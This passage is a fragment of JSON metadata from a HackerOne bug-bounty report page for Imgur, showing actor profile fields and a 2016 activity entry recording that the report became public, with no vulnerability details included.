889eb5c7810931726807f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":836364,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-03-12T07:09:50.650Z","updated_at":"2016-03-12T07:09:50.650Z","actor":{"url":"/imgur","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Imgur"}},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}